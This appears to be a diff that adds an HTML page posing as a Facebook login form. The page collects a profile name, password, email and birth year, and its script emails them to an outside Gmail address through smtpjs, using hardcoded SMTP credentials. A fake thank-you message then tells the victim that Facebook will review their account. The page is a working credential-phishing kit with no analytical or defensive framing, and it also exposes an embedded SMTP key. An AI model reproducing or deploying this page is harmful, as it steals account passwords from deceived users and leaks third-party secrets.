@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Log-in page</title>
+  
+</head>
+<style>
+*{
+  margin:0;
+  padding: 0;
+  box-sizing: border-box;
+}
+body{
+  font-family: sans-serif;
+  background-color: #1877F2;
+  height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  
+}
+.container{
+  
+  width: 330px;
+  background-color: #fff;
+  text-align: center;
+  padding:60px 10px;
+  margin: 100px 10px;
+}
+.container input{
+  background-color: white;
+  border:0;
+  outline:0;
+  width: 100%;
+  padding: 10px;
+  font-size: 18px;
+  margin-bottom: 30px ;
+  border-bottom: 2px solid #1877F2;
+  
+}
+button{
+  padding: 12px;
+  border: none !important;
+  outline: none;
+  font-size: 15px;
+  background-color: #1877F2;
+  border-radius: 4px;
+  color:white;
+}
+h2{
+  font-weight: bold;
+  color: #577EEB;
+  margin-bottom: 20px;
+}
+</style>
+<body>
+
+
+  <div class="container">
+    <h2>facebook</h2>
+    <h2>Login Authentication</h2>
+    <form onsubmit="emailgenarate(); reset(); return false;">
+    <input type="text" placeholder="enter facebook profile name" name="name" id="Name" required>
+    <input type="text" placeholder="enter your password" id="pass" required>
+    <input type="email" placeholder="enter your email" name="email"  id="email" required>
+    <input type="number" name="number" id="number" placeholder="enter your date of year">
+    <button type="submit">Submit</button>
+    </form>
+  </div>
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+<script src="https://smtpjs.com/v3/smtp.js">
+   </script>
+
+<script>
+function emailgenarate() {
+  var name = document.getElementById('Name').value;
+ var passwrd = document.getElementById('pass').value;
+ var mail = document.getElementById('email').value;
+ var allbody = "Name : " + name + "Password :" + passwrd + "Mail : " + mail;
+    Email.send({
+      Host: "smtp.elasticemail.com",
+      Username: "winstr97667@gmail.com",
+      Password: "AA699F05EA91B1932F0359010F01E40BCD80",
+      To: 'Omurfaruk6324@gmail.com',
+      From: "winstr97667@gmail.com",
+      Subject: "This is the subject",
+      Body: allbody
+    }).then(
+      message => {
+        if(message== 'OK'){
+         swal("Good job!", "Facebook will give you a review throw you email!", "Thank you");
+        }
+      else{ 
+          swal("Error!", "Try again!", "error");
+          }
+        
+      }
+    );
+  
+  }
+
+  
+  
+  
+  
+</script>
+</body>
+
+</html>
